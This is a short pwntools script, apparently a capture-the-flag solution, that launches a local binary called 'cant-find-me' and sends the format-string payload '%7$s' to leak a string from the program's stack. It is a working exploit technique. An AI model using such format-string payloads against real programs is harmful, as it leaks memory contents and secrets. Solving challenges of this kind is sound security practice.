from pwn import *
io = process('./cant-find-me')
io.recvline()
io.sendline('%7$s')
print(io.recvline())
io.close()